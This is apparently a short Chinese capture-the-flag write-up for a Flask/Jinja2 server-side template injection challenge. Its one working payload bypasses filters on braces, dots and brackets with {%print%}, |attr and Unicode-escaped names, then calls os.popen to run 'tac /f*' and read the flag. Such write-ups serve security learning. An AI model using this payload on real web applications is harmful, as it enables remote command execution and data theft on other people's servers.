---
title: Normal SSTI
date: 2026-02-05 12:00:00
tags:
  - 题解
  - SSTI
---
{% raw %}


这里测试发现{{}}被过滤了，用{%print()%}。.和[]被过滤使用|attr使用flask里的lipsum执行命令构造payload编码得到：

test?url={%print((((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("os"))|attr("\u0070\u006f\u0070\u0065\u006e")("\u0074\u0061\u0063\u0020\u002f\u0066\u002a"))|attr("\u0072\u0065\u0061\u0064")())%}

输入得到flag


![Normal-SSTI_f52ea896](/images/writeups/Normal-SSTI_f52ea896.png)

{% endraw %}
